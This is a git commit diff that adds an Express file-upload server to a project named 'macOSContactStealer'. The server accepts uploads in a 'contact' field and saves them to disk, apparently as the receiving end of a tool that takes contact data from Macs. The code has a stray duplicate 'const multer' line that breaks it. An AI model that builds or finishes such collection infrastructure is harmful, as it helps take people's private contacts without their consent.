8cdf50b96b2500e09711f44845de27de90de5f55
Dan Goodman <xxdanthegoodmanxx@gmail.com>
2018-08-13 09:53:54 -0400

    Made server

--- macOSContactStealer/server.js
+++ macOSContactStealer/server.js
@@ -1,1 +1,23 @@
 const express = require('express');
+const multer = require('multer');
+
+const app = express();
+const multer
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        cb(null, './uploads/')
+    },
+    filename: function (req, file, cb) {
+        cb(null, file.fieldname + '-' + Date.now())
+    }
+})
+const upload = multer({ storage })
+
+app.route('/')
+.post(upload.single('contact'), (req, res) => {
+    res.send("Thanks")
+})
+
+app.listen(80, () => {
+    console.log("Listening on port 80")
+})
